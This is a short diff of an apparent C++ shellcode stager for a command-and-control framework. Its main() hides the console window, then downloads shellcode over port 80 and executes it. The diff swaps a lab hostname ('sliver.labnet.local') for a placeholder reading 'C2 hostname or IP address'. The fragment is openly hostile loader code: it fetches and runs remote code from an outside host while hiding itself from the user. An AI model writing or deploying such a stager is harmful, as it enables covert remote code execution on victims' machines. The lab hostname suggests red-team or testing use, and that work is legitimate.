@@ -16,7 +16,7 @@ void Execute(Shellcode shellcode);
 int main() {
 	::ShowWindow(::GetConsoleWindow(), SW_HIDE); // hide console window
 
-	Shellcode shellcode = Download(L"sliver.labnet.local", 80);
+	Shellcode shellcode = Download(L"C2 hostname or IP address", 80);
 	Execute(shellcode);
 
 	return 0;
